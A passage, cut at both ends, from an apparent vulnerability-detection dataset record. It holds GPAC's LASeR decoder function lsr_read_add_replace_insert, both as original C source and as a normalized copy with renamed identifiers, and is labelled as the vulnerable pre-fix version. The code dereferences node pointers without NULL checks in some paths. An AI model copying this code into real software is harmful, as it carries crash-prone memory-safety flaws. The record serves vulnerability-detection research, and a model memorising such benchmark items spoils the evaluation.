void *VAR_49, *VAR_50;
void *VAR_51 = lsr_read_update_value_indexed(VAR_0, (GF_Node*)VAR_4, VAR_19, VAR_3.far_ptr, VAR_8, VAR_2==VAR_36, 0, NULL);
switch (VAR_19) {
case VAR_52:
case VAR_53:
case VAR_54:
case VAR_55:
VAR_50 = gf_list_pop_front(*(GF_List **)VAR_51);
if (VAR_2==VAR_36) {
gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_50, VAR_8);
} else {
VAR_49 = gf_list_get(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
gf_free(VAR_49);
gf_list_rem(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_50, VAR_8);
}
gf_node_changed((GF_Node*)VAR_4, NULL);
gf_list_del(*(GF_List **)VAR_51);
gf_free(VAR_51);
break;
case VAR_56:
VAR_47 = (Fixed *) gf_list_pop_front(*(GF_List **)VAR_51);
VAR_48 = (Fixed *) gf_list_pop_front(*(GF_List **)VAR_51);
gf_list_del(*(GF_List **)VAR_51);
gf_free(VAR_51);
if (VAR_2==VAR_36) {
gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_47, VAR_8);
gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_48, VAR_8+1);
} else {
VAR_49 = gf_list_get(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
gf_free(VAR_49);
gf_list_rem(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
VAR_49 = gf_list_get(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
gf_free(VAR_49);
gf_list_rem(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_47, VAR_8);
gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_48, VAR_8);
}
gf_node_changed((GF_Node*)VAR_4, NULL);
break;
case VAR_57:
VAR_47 = (Fixed*)VAR_51;
switch (VAR_8) {
case 0:
((SVG_ViewBox*)VAR_3.far_ptr)->x = *VAR_47;
break;
case 1:
((SVG_ViewBox*)VAR_3.far_ptr)->y = *VAR_47;
break;
case 2:
((SVG_ViewBox*)VAR_3.far_ptr)->width = *VAR_47;
break;
case 3:
((SVG_ViewBox*)VAR_3.far_ptr)->height = *VAR_47;
break;
}
gf_free(VAR_51);
gf_node_changed((GF_Node*)VAR_4, NULL);
break;
case VAR_58:
VAR_47 = (Fixed*)VAR_51;
if (VAR_2==VAR_36) {
SVG_StrokeDashArray*VAR_59 = (SVG_StrokeDashArray*)VAR_3.far_ptr;
if (gf_sg_vrml_mf_insert(&VAR_59->array, VAR_60, (void*) &VAR_48, VAR_8)==VAR_61)
*VAR_48 = *VAR_47;
} else {
SVG_StrokeDashArray*VAR_59 = (SVG_StrokeDashArray*)VAR_3.far_ptr;
if (VAR_8<(s32)VAR_59->array.count) VAR_59->array.vals[VAR_8] = *VAR_47;
}
gf_free(VAR_51);
gf_node_changed((GF_Node*)VAR_4, NULL);
break;
default:
gf_free(VAR_51);
break;
}
}
} else {
GF_FieldInfo VAR_51;
VAR_51 = VAR_3;
if (VAR_8==-1) {
VAR_51.far_ptr = gf_svg_create_attribute_value(VAR_3.fieldType);
lsr_read_update_value(VAR_0, VAR_4, VAR_39, VAR_19, VAR_51.far_ptr, VAR_4->sgprivate->tag);
} else {
VAR_51.far_ptr = lsr_read_update_value_indexed(VAR_0, VAR_4, VAR_19, NULL, VAR_8, 0, 1, NULL);
}
gf_svg_attributes_add(&VAR_3, &VAR_51, &VAR_3, 0);
gf_svg_delete_attribute_value(VAR_3.fieldType, VAR_51.far_ptr, gf_node_get_graph(VAR_4));
}
}
}
else if (VAR_5 && (VAR_10>=0)) {
u32 VAR_62 = gf_lsr_anim_type_to_attribute(VAR_10);
if (VAR_1) {
VAR_6 = gf_sg_command_new(VAR_0->sg, VAR_2 ? VAR_17 : VAR_21);
gf_list_add(VAR_1, VAR_6);
VAR_6->node = VAR_4;
gf_node_register(VAR_6->node, NULL);
VAR_6->fromNodeID = VAR_13;
VAR_6->fromFieldIndex = VAR_62;
VAR_7 = gf_sg_command_field_new(VAR_6);
VAR_7->pos = VAR_8;
VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
} else {
u32 VAR_39;
GF_FieldInfo VAR_63;
VAR_39 = gf_lsr_anim_type_to_attribute(VAR_9);
gf_node_get_field(VAR_4, VAR_39, &VAR_3);
gf_node_get_field(VAR_5, VAR_62, &VAR_63);
if (VAR_2) {
gf_svg_attributes_copy(&VAR_3, &VAR_63, 0);
} else {
gf_svg_attributes_add(&VAR_3, &VAR_63, &VAR_3, 0);
}
}
}
lsr_read_any_attribute(VAR_0, NULL, 1);
if (!VAR_2) return VAR_61;
GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""opt_group"");
if (VAR_11) {
if (VAR_1) {
u32 VAR_64;
GF_ChildNodeItem *VAR_65 = NULL;
if (VAR_2==VAR_36) VAR_64 = 1;
else VAR_64 = lsr_read_vluimsbf5(VAR_0, ""count"");
VAR_6 = gf_sg_command_new(VAR_0->sg, (VAR_2==VAR_66) ? VAR_17 : VAR_16);
gf_list_add(VAR_1, VAR_6);
VAR_6->node = VAR_4;
gf_node_register(VAR_6->node, NULL);
VAR_7 = gf_sg_command_field_new(VAR_6);
VAR_7->pos = VAR_8;
if (!VAR_64 && (VAR_9==VAR_22)) {
VAR_7->fieldIndex = -1;
} else if (VAR_64==1) {
VAR_7->new_node = lsr_read_update_content_model(VAR_0, (SVG_Element *) VAR_4);
gf_node_register(VAR_7->new_node, NULL);
if (VAR_9>=0) VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
} else {
VAR_7->field_ptr = &VAR_7->node_list;
while (VAR_64) {
GF_Node *VAR_15 = lsr_read_update_content_model(VAR_0, (SVG_Element *) VAR_4);
gf_node_register(VAR_15, NULL);
gf_node_list_add_child_last(& VAR_7->node_list, VAR_15, &VAR_65);
VAR_64--;
}
}
} else {
SVG_Element*VAR_67 = (SVG_Element*)VAR_4;
GF_ChildNodeItem *VAR_65 = NULL;
u32 VAR_64;
if (VAR_2==VAR_36) VAR_64 = 1;
else VAR_64 = lsr_read_vluimsbf5(VAR_0, ""count"");
if (VAR_2==VAR_66) {
if (VAR_8>=0) {
GF_Node *VAR_15 = gf_node_list_del_child_idx(&VAR_67->children, VAR_8);
if (VAR_15) gf_node_unregister(VAR_15, VAR_4);
} else {
gf_node_unregister_children(VAR_4, VAR_67->children);
VAR_67->children = NULL;
}
}
if ((VAR_2==VAR_36) || (gf_lsr_anim_type_to_attribute(VAR_9) == VAR_68)) {
while (VAR_64) {
GF_Node *VAR_15 = lsr_read_update_content_model(VAR_0, VAR_67);
if (VAR_15) {
if (VAR_8>=0) {
gf_node_list_insert_child(&VAR_67->children, VAR_15, VAR_8);
} else {
gf_node_list_add_child_last(&VAR_67->children, VAR_15, &VAR_65);
}
gf_node_register(VAR_15, VAR_4);
}
VAR_64--;
}
gf_node_changed(VAR_4, NULL);
}
else if ((VAR_9==-1) && (VAR_64==1)) {
GF_Node *VAR_15 = lsr_read_update_content_model(VAR_0, VAR_67);
gf_node_replace((GF_Node*)VAR_67, VAR_15, 0);
}
}
}
return VAR_61;
}",gpac/ef86a8eba3b166b885dec219066dd3a47501e03a/lsr_dec.c/vul/before/0.json,"static GF_Err lsr_read_add_replace_insert(GF_LASeRCodec *lsr, GF_List *com_list, u32 com_type)
{
	GF_FieldInfo info;
	GF_Node *n, *operandNode;
	GF_Command *com;
	GF_CommandField *field;
	s32 idx, att_type, op_att_type;
	u32 type, idref, op_idref = 0;

	operandNode = NULL;
	op_att_type = -1;

	att_type = lsr_get_attribute_name(lsr);

	idx = -1;
	if (com_type) {
		GF_LSR_READ_INT(lsr, type, 1, ""has_index"");
		if (type) idx = lsr_read_vluimsbf5(lsr, ""index"");
	}
	if (com_type!=3) {
		GF_LSR_READ_INT(lsr, type, 1, ""has_operandAttribute"");
		if (type) GF_LSR_READ_INT(lsr, op_att_type, 8, ""attributeName"");
		GF_LSR_READ_INT(lsr, type, 1, ""has_operandElementId"");
		if (type) {
			op_idref = lsr_read_codec_IDREF_command(lsr, ""operandElementId"");
			operandNode = gf_sg_find_node(lsr->sg, op_idref);
			if (!operandNode)
				return GF_NON_COMPLIANT_BITSTREAM;
		}
	}
	idref = lsr_read_codec_IDREF_command(lsr, ""ref"");

	n = gf_sg_find_node(lsr->sg, idref);
	if (!n) {
		if (!com_list) {
			return GF_NON_COMPLIANT_BITSTREAM;
		}
	}

	GF_LSR_READ_INT(lsr, type, 1, ""has_value"");
	if (type) {
		/*node or node-list replacement*/
		if (att_type==-2) {
			lsr_read_byte_align_string(lsr, NULL, ""anyXML"");
		}
		else if (att_type<0) {
			GF_Node *new_node;
			if (!com_type)
				return GF_NON_COMPLIANT_BITSTREAM;
			GF_LSR_READ_INT(lsr, type, 1, ""isInherit"");
			if (type)
				return GF_NON_COMPLIANT_BITSTREAM;
			if (idx==-1) {
				GF_LSR_READ_INT(lsr, type, 1, ""escapeFlag"");
				if (type)
					return GF_NON_COMPLIANT_BITSTREAM;
			}

			new_node = lsr_read_update_content_model(lsr, (idx==-1) ? NULL : (SVG_Element *)n);
			if (com_list) {
				com = gf_sg_command_new(lsr->sg, (com_type==3) ? GF_SG_LSR_INSERT : GF_SG_LSR_REPLACE);
				gf_list_add(com_list, com);
				if (n) {
					com->node = n;
					gf_node_register(com->node, NULL);
				} else {
					com->RouteID = idref;
					gf_list_add(lsr->unresolved_commands, com);
				}
				field = gf_sg_command_field_new(com);
				field->pos = idx;
				field->new_node = new_node;
				if (new_node) gf_node_register(new_node, NULL);
			} else if (com_type==3) {
				gf_node_list_insert_child(& ((SVG_Element *)n)->children, new_node, idx);
				if (new_node) gf_node_register(new_node, n);
			} else {
				/*child replacement*/
				if (idx!=-1) {
					GF_Node *old = gf_node_list_get_child( ((SVG_Element *)n)->children, idx);
					if (old)
						gf_node_replace(old, new_node, 0);
					else {
						gf_node_list_add_child( & ((SVG_Element *)n)->children, new_node);
						if (new_node) gf_node_register(new_node, n);
					}
				} else {
					/*node replacement*/
					gf_node_replace(n, new_node, 0);
				}
			}
		}
		/*value replace/add*/
		else if (com_list) {
			u32 field_type;
			Bool text_content = 0;
			com = gf_sg_command_new(lsr->sg, (com_type==0) ? GF_SG_LSR_ADD : (com_type==3) ? GF_SG_LSR_INSERT : GF_SG_LSR_REPLACE);
			field = gf_sg_command_field_new(com);
			field->pos = idx;
			field_type = 0;
			switch (att_type) {
			/*text*/
			case LSR_UPDATE_TYPE_TEXT_CONTENT:
				text_content = 1;
				break;
			/*matrix.translation, scale or rotate*/
			case LSR_UPDATE_TYPE_SCALE:
				field->fieldType = field_type = SVG_Transform_Scale_datatype;
				field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
				break;
			case LSR_UPDATE_TYPE_ROTATE:
				field->fieldType = field_type = SVG_Transform_Rotate_datatype;
				field->fieldIndex = TAG_SVG_ATT_transform;
				break;
			case LSR_UPDATE_TYPE_TRANSLATION:
				field->fieldType = field_type = SVG_Transform_Translate_datatype;
				field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
				break;
			case LSR_UPDATE_TYPE_SVG_HEIGHT:
				field->fieldIndex = TAG_SVG_ATT_height;
				field_type = field->fieldType = SVG_Length_datatype;
				break;
			case LSR_UPDATE_TYPE_SVG_WIDTH:
				field->fieldIndex = TAG_SVG_ATT_width;
				field_type = field->fieldType = SVG_Length_datatype;
				break;
			default:
				field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
				if (field->fieldIndex == (u32)-1) {
					lsr->last_error = GF_NON_COMPLIANT_BITSTREAM;
					gf_sg_command_del(com);
					return lsr->last_error;
				}
				field_type = field->fieldType = gf_xml_get_attribute_type(field->fieldIndex);
				break;
			}
			gf_list_add(com_list, com);
			if (n) {
				com->node = n;
				gf_node_register(com->node, NULL);
			} else {
				com->RouteID = idref;
				gf_list_add(lsr->unresolved_commands, com);
			}
			if (idx==-1) {
				if (text_content) {
					GF_DOMText *text = gf_dom_new_text_node(lsr->sg);
					gf_node_register((GF_Node *)text, NULL);
					lsr_read_byte_align_string(lsr, &text->textContent, ""val"");
					field->new_node = (GF_Node*)text;
				} else {
					field->field_ptr = gf_svg_create_attribute_value(field_type);
					lsr_read_update_value(lsr, NULL, field->fieldIndex, field->fieldType, field->field_ptr, n ? n->sgprivate->tag : 0);
				}
			} else {
				field->field_ptr = lsr_read_update_value_indexed(lsr, (GF_Node*)n, field_type, NULL, idx, com_type==LSR_UPDATE_INSERT, 1, &field->fieldType);
			}
		} else {
			GF_Point2D matrix_tmp;
			SVG_Point_Angle matrix_tmp_rot;
			u32 fieldIndex = 0;
			u32 field_type = 0;
			Bool text_content = 0;
			Bool is_lsr_transform = 0;
			switch (att_type) {
			/*text*/
			case LSR_UPDATE_TYPE_TEXT_CONTENT:
				text_content = 1;
				break;
			/*matrix.translation, scale or rotate*/
			case LSR_UPDATE_TYPE_SCALE:
				info.far_ptr = (void *)&matrix_tmp;
				field_type = SVG_Transform_Scale_datatype;
				is_lsr_transform = 1;
				break;
			case LSR_UPDATE_TYPE_ROTATE:
				info.far_ptr = (void *)&matrix_tmp_rot;
				field_type = SVG_Transform_Rotate_datatype;
				is_lsr_transform = 1;
				break;
			case LSR_UPDATE_TYPE_TRANSLATION:
				info.far_ptr = (void *)&matrix_tmp;
				field_type = SVG_Transform_Translate_datatype;
				is_lsr_transform = 1;
				break;
			default:
				fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
				gf_node_get_attribute_by_tag(n, fieldIndex, 1, 0, &info);
				field_type = info.fieldType;
				break;
			}
			info.fieldType = field_type;
			if (is_lsr_transform) {
				SVG_Transform *dest;
				if (idx==-1) {
					lsr_read_update_value(lsr, NULL, fieldIndex, field_type, info.far_ptr, 0);
				} else {
					assert(0);
				}


//				fieldIndex = gf_node_get_attribute_by_tag((GF_Node*)n, TAG_SVG_ATT_transform, 1, 1, &info);
				dest = (SVG_Transform *)info.far_ptr;
				if (com_type) {
					GF_Point2D scale, translate;
					SVG_Point_Angle rotate;
					if (gf_mx2d_decompose(&dest->mat, &scale, &rotate.angle, &translate)) {
						gf_mx2d_init(dest->mat);
						if (att_type==LSR_UPDATE_TYPE_SCALE) scale = matrix_tmp;
						else if (att_type==LSR_UPDATE_TYPE_TRANSLATION) translate = matrix_tmp;
						else if (att_type==LSR_UPDATE_TYPE_ROTATE) rotate = matrix_tmp_rot;

						gf_mx2d_add_scale(&dest->mat, scale.x, scale.y);
						gf_mx2d_add_rotation(&dest->mat, 0, 0, rotate.angle);
						gf_mx2d_add_translation(&dest->mat, translate.x, translate.y);
					}
				}
				else if (att_type==LSR_UPDATE_TYPE_SCALE) gf_mx2d_add_scale(&dest->mat, matrix_tmp.x, matrix_tmp.y);
				else if (att_type==LSR_UPDATE_TYPE_TRANSLATION) gf_mx2d_add_translation(&dest->mat, matrix_tmp.x, matrix_tmp.y);
				else if (att_type==LSR_UPDATE_TYPE_ROTATE) gf_mx2d_add_rotation(&dest->mat, 0, 0, matrix_tmp_rot.angle);

				gf_node_changed((GF_Node*)n, &info);
			}
			else if (com_type) {
				if (text_content) {
					GF_DOMText *t = NULL;
					if (idx>=0) {
						if (com_type==LSR_UPDATE_INSERT) {
							t = gf_dom_new_text_node(n->sgprivate->scenegraph);
							gf_node_register((GF_Node *)t, n);
							gf_node_list_insert_child(&((GF_ParentNode *)n)->children, (GF_Node*)t, idx);
						} else {
							t = (GF_DOMText *) gf_node_list_get_child(((SVG_Element*)n)->children, idx);
							if (t->sgprivate->tag!=TAG_DOMText) t = NULL;
						}
					} else {
						/*this is a replace, reset ALL node content*/
						gf_sg_parent_reset(n);
						t = gf_dom_add_text_node(n, NULL);
					}
					lsr_read_byte_align_string(lsr, t ? &t->textContent : NULL, ""textContent"");
					gf_node_changed(n, NULL);
				} else if (idx==-1) {
					lsr_read_update_value(lsr, (GF_Node*)n, fieldIndex, field_type, info.far_ptr, n->sgprivate->tag);
				} else {
					Fixed *v1, *v2;
					//SMIL_Time *t;
					void *prev, *new_item;
					void *tmp = lsr_read_update_value_indexed(lsr, (GF_Node*)n, field_type, info.far_ptr, idx, com_type==LSR_UPDATE_INSERT, 0, NULL);
					switch (field_type) {
					/*generic GF_List containers, no type translation needed*/
					case SMIL_KeyTimes_datatype/*ITYPE_keyTime*/:
					case SMIL_KeySplines_datatype/*ITYPE_float*/:
					case SVG_Points_datatype/*ITYPE_point*/:
					case SMIL_Times_datatype/*ITYPE_smil_time*/:
						new_item = gf_list_pop_front(*(GF_List **)tmp);
						if (com_type==LSR_UPDATE_INSERT) {
							gf_list_insert(*(SVG_Coordinates*)info.far_ptr, new_item, idx);
						} else {
							prev = gf_list_get(*(SVG_Coordinates*)info.far_ptr, idx);
							gf_free(prev);
							gf_list_rem(*(SVG_Coordinates*)info.far_ptr, idx);
							gf_list_insert(*(SVG_Coordinates*)info.far_ptr, new_item, idx);
						}
						gf_node_changed((GF_Node*)n, NULL);
						gf_list_del(*(GF_List **)tmp);
						gf_free(tmp);
						break;
					/*list of floats - to check when implementing it...*/
					case SMIL_KeyPoints_datatype/*ITYPE_0to1 - keyPoints*/:
						v1 = (Fixed *) gf_list_pop_front(*(GF_List **)tmp);
						v2 = (Fixed *) gf_list_pop_front(*(GF_List **)tmp);
						gf_list_del(*(GF_List **)tmp);
						gf_free(tmp);

						if (com_type==LSR_UPDATE_INSERT) {
							gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v1, idx);
							gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v2, idx+1);
						} else {
							prev = gf_list_get(*(SVG_Coordinates*)info.far_ptr, idx);
							gf_free(prev);
							gf_list_rem(*(SVG_Coordinates*)info.far_ptr, idx);
							prev = gf_list_get(*(SVG_Coordinates*)info.far_ptr, idx);
							gf_free(prev);
							gf_list_rem(*(SVG_Coordinates*)info.far_ptr, idx);
							gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v1, idx);
							gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v2, idx);
						}
						gf_node_changed((GF_Node*)n, NULL);
						break;
					case SVG_ViewBox_datatype:
						v1 = (Fixed*)tmp;
						switch (idx) {
						case 0:
							((SVG_ViewBox*)info.far_ptr)->x = *v1;
							break;
						case 1:
							((SVG_ViewBox*)info.far_ptr)->y = *v1;
							break;
						case 2:
							((SVG_ViewBox*)info.far_ptr)->width = *v1;
							break;
						case 3:
							((SVG_ViewBox*)info.far_ptr)->height = *v1;
							break;
						}
						gf_free(tmp);
						gf_node_changed((GF_Node*)n, NULL);
						break;
					case SVG_StrokeDashArray_datatype:
						v1 = (Fixed*)tmp;
						if (com_type==LSR_UPDATE_INSERT) {
							SVG_StrokeDashArray*da = (SVG_StrokeDashArray*)info.far_ptr;
							/*use MFFloat for insert*/
							if (gf_sg_vrml_mf_insert(&da->array, GF_SG_VRML_MFFLOAT, (void*) &v2, idx)==GF_OK)
								*v2 = *v1;
						} else {
							SVG_StrokeDashArray*da = (SVG_StrokeDashArray*)info.far_ptr;
							if (idx<(s32)da->array.count) da->array.vals[idx] = *v1;
						}
						gf_free(tmp);
						gf_node_changed((GF_Node*)n, NULL);
						break;
					default:
						gf_free(tmp);
						break;
					}
				}
			} else {
				GF_FieldInfo tmp;
				tmp = info;
				if (idx==-1) {
					tmp.far_ptr = gf_svg_create_attribute_value(info.fieldType);
					lsr_read_update_value(lsr, n, fieldIndex, field_type, tmp.far_ptr, n->sgprivate->tag);
				} else {
					tmp.far_ptr = lsr_read_update_value_indexed(lsr, n, field_type, NULL, idx, 0, 1, NULL);
				}
				gf_svg_attributes_add(&info, &tmp, &info, 0);
				gf_svg_delete_attribute_value(info.fieldType, tmp.far_ptr, gf_node_get_graph(n));
			}
		}
	}
	/*copy from node*/
	else if (operandNode && (op_att_type>=0)) {
		u32 opFieldIndex = gf_lsr_anim_type_to_attribute(op_att_type);
		if (com_list) {
			com = gf_sg_command_new(lsr->sg, com_type ? GF_SG_LSR_REPLACE : GF_SG_LSR_ADD);
			gf_list_add(com_list, com);
			com->node = n;
			gf_node_register(com->node, NULL);
			com->fromNodeID = op_idref;
			com->fromFieldIndex = opFieldIndex;
			field = gf_sg_command_field_new(com);
			field->pos = idx;
			field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
		} else {
			u32 fieldIndex;
			GF_FieldInfo op_info;
			fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
			gf_node_get_field(n, fieldIndex, &info);
			gf_node_get_field(operandNode, opFieldIndex, &op_info);
			if (com_type) {
				gf_svg_attributes_copy(&info, &op_info, 0);
			} else {
				gf_svg_attributes_add(&info, &op_info, &info, 0);
			}
		}
	}

	lsr_read_any_attribute(lsr, NULL, 1);

	/*if not add*/
	if (!com_type) return GF_OK;

	/*list replacement*/
	GF_LSR_READ_INT(lsr, type, 1, ""opt_group"");
	if (type) {

		if (com_list) {
			u32 count;
			GF_ChildNodeItem *last = NULL;

			if (com_type==LSR_UPDATE_INSERT) count = 1;
			else count = lsr_read_vluimsbf5(lsr, ""count"");

			com = gf_sg_command_new(lsr->sg, (com_type==LSR_UPDATE_REPLACE) ? GF_SG_LSR_REPLACE : GF_SG_LSR_INSERT);
			gf_list_add(com_list, com);
			com->node = n;
			gf_node_register(com->node, NULL);
			field = gf_sg_command_field_new(com);
			field->pos = idx;

			if (!count && (att_type==LSR_UPDATE_TYPE_TEXT_CONTENT)) {
				field->fieldIndex = -1;
			} else if (count==1) {
				field->new_node = lsr_read_update_content_model(lsr, (SVG_Element *) n);
				gf_node_register(field->new_node, NULL);
				if (att_type>=0) field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
			} else {
				field->fieldType = SVG_NodeList_datatype;
				field->field_ptr = &field->node_list;
				while (count) {
					GF_Node *new_node = lsr_read_update_content_model(lsr, (SVG_Element *) n);
					gf_node_register(new_node, NULL);
					gf_node_list_add_child_last(& field->node_list, new_node, &last);
					count--;
				}
			}
		} else {
			SVG_Element*elt = (SVG_Element*)n;
			GF_ChildNodeItem *last = NULL;
			u32 count;
			if (com_type==LSR_UPDATE_INSERT) count = 1;
			else count = lsr_read_vluimsbf5(lsr, ""count"");

			if (com_type==LSR_UPDATE_REPLACE) {
				if (idx>=0) {
					GF_Node *new_node = gf_node_list_del_child_idx(&elt->children, idx);
					if (new_node) gf_node_unregister(new_node, n);
				} else {
					gf_node_unregister_children(n, elt->children);
					elt->children = NULL;
				}
			}
			if ((com_type==LSR_UPDATE_INSERT) || (gf_lsr_anim_type_to_attribute(att_type) == TAG_LSR_ATT_children)) {
				while (count) {
					GF_Node *new_node = lsr_read_update_content_model(lsr, elt);
					if (new_node) {
						if (idx>=0) {
							gf_node_list_insert_child(&elt->children, new_node, idx);
						} else {
							gf_node_list_add_child_last(&elt->children, new_node, &last);
						}
						gf_node_register(new_node, n);
					}
					count--;
				}
				gf_node_changed(n, NULL);
			}
			/*node replacement*/
			else if ((att_type==-1) && (count==1)) {
				GF_Node *new_node = lsr_read_update_content_model(lsr, elt);
				gf_node_replace((GF_Node*)elt, new_node, 0);
			}
		}
	}
	return GF_OK;
}","static GF_Err lsr_read_add_replace_insert(GF_LASeRCodec *VAR_0, GF_List *VAR_1, u32 VAR_2)
{
	GF_FieldInfo VAR_3;
	GF_Node *VAR_4, *VAR_5;
	GF_Command *VAR_6;
	GF_CommandField *VAR_7;
	s32 VAR_8, VAR_9, VAR_10;
	u32 VAR_11, VAR_12, VAR_13 = 0;

	VAR_5 = NULL;
	VAR_10 = -1;

	VAR_9 = lsr_get_attribute_name(VAR_0);

	VAR_8 = -1;
	if (VAR_2) {
		GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_index"");
		if (VAR_11) VAR_8 = lsr_read_vluimsbf5(VAR_0, ""index"");
	}
	if (VAR_2!=3) {
		GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_operandAttribute"");
		if (VAR_11) GF_LSR_READ_INT(VAR_0, VAR_10, 8, ""attributeName"");
		GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_operandElementId"");
		if (VAR_11) {
			VAR_13 = lsr_read_codec_IDREF_command(VAR_0, ""operandElementId"");
			VAR_5 = gf_sg_find_node(VAR_0->sg, VAR_13);
			if (!VAR_5)
				return VAR_14;
		}
	}
	VAR_12 = lsr_read_codec_IDREF_command(VAR_0, ""ref"");

	VAR_4 = gf_sg_find_node(VAR_0->sg, VAR_12);
	if (!VAR_4) {
		if (!VAR_1) {
			return VAR_14;
		}
	}

	GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_value"");
	if (VAR_11) {
		/* COMMENT_0 */
		if (VAR_9==-2) {
			lsr_read_byte_align_string(VAR_0, NULL, ""anyXML"");
		}
		else if (VAR_9<0) {
			GF_Node *VAR_15;
			if (!VAR_2)
				return VAR_14;
			GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""isInherit"");
			if (VAR_11)
				return VAR_14;
			if (VAR_8==-1) {
				GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""escapeFlag"");
				if (VAR_11)
					return VAR_14;
			}

			VAR_15 = lsr_read_update_content_model(VAR_0, (VAR_8==-1) ? NULL : (SVG_Element *)VAR_4);
			if (VAR_1) {
				VAR_6 = gf_sg_command_new(VAR_0->sg, (VAR_2==3) ? VAR_16 : VAR_17);
				gf_list_add(VAR_1, VAR_6);
				if (VAR_4) {
					VAR_6->node = VAR_4;
					gf_node_register(VAR_6->node, NULL);
				} else {
					VAR_6->RouteID = VAR_12;
					gf_list_add(VAR_0->unresolved_commands, VAR_6);
				}
				VAR_7 = gf_sg_command_field_new(VAR_6);
				VAR_7->pos = VAR_8;
				VAR_7->new_node = VAR_15;
				if (VAR_15) gf_node_register(VAR_15, NULL);
			} else if (VAR_2==3) {
				gf_node_list_insert_child(& ((SVG_Element *)VAR_4)->children, VAR_15, VAR_8);
				if (VAR_15) gf_node_register(VAR_15, VAR_4);
			} else {
				/* COMMENT_1 */
				if (VAR_8!=-1) {
					GF_Node *VAR_18 = gf_node_list_get_child( ((SVG_Element *)VAR_4)->children, VAR_8);
					if (VAR_18)
						gf_node_replace(VAR_18, VAR_15, 0);
					else {
						gf_node_list_add_child( & ((SVG_Element *)VAR_4)->children, VAR_15);
						if (VAR_15) gf_node_register(VAR_15, VAR_4);
					}
				} else {
					/* COMMENT_2 */
					gf_node_replace(VAR_4, VAR_15, 0);
				}
			}
		}
		/* COMMENT_3 */
		else if (VAR_1) {
			u32 VAR_19;
			Bool VAR_20 = 0;
			VAR_6 = gf_sg_command_new(VAR_0->sg, (VAR_2==0) ? VAR_21 : (VAR_2==3) ? VAR_16 : VAR_17);
			VAR_7 = gf_sg_command_field_new(VAR_6);
			VAR_7->pos = VAR_8;
			VAR_19 = 0;
			switch (VAR_9) {
			/* COMMENT_4 */
			case VAR_22:
				VAR_20 = 1;
				break;
			/* COMMENT_5 */
			case VAR_23:
				VAR_7->fieldType = VAR_19 = VAR_24;
				VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
				break;
			case VAR_25:
				VAR_7->fieldType = VAR_19 = VAR_26;
				VAR_7->fieldIndex = VAR_27;
				break;
			case VAR_28:
				VAR_7->fieldType = VAR_19 = VAR_29;
				VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
				break;
			case VAR_30:
				VAR_7->fieldIndex = VAR_31;
				VAR_19 = VAR_7->fieldType = VAR_32;
				break;
			case VAR_33:
				VAR_7->fieldIndex = VAR_34;
				VAR_19 = VAR_7->fieldType = VAR_32;
				break;
			default:
				VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
				if (VAR_7->fieldIndex == (u32)-1) {
					VAR_0->last_error = VAR_14;
					gf_sg_command_del(VAR_6);
					return VAR_0->last_error;
				}
				VAR_19 = VAR_7->fieldType = gf_xml_get_attribute_type(VAR_7->fieldIndex);
				break;
			}
			gf_list_add(VAR_1, VAR_6);
			if (VAR_4) {
				VAR_6->node = VAR_4;
				gf_node_register(VAR_6->node, NULL);
			} else {
				VAR_6->RouteID = VAR_12;
				gf_list_add(VAR_0->unresolved_commands, VAR_6);
			}
			if (VAR_8==-1) {
				if (VAR_20) {
					GF_DOMText *VAR_35 = gf_dom_new_text_node(VAR_0->sg);
					gf_node_register((GF_Node *)VAR_35, NULL);
					lsr_read_byte_align_string(VAR_0, &VAR_35->textContent, ""val"");
					VAR_7->new_node = (GF_Node*)VAR_35;
				} else {
					VAR_7->field_ptr = gf_svg_create_attribute_value(VAR_19);
					lsr_read_update_value(VAR_0, NULL, VAR_7->fieldIndex, VAR_7->fieldType, VAR_7->field_ptr, VAR_4 ? VAR_4->sgprivate->tag : 0);
				}
			} else {
				VAR_7->field_ptr = lsr_read_update_value_indexed(VAR_0, (GF_Node*)VAR_4, VAR_19, NULL, VAR_8, VAR_2==VAR_36, 1, &VAR_7->fieldType);
			}
		} else {
			GF_Point2D VAR_37;
			SVG_Point_Angle VAR_38;
			u32 VAR_39 = 0;
			u32 VAR_19 = 0;
			Bool VAR_20 = 0;
			Bool VAR_40 = 0;
			switch (VAR_9) {
			/* COMMENT_4 */
			case VAR_22:
				VAR_20 = 1;
				break;
			/* COMMENT_5 */
			case VAR_23:
				VAR_3.far_ptr = (void *)&VAR_37;
				VAR_19 = VAR_24;
				VAR_40 = 1;
				break;
			case VAR_25:
				VAR_3.far_ptr = (void *)&VAR_38;
				VAR_19 = VAR_26;
				VAR_40 = 1;
				break;
			case VAR_28:
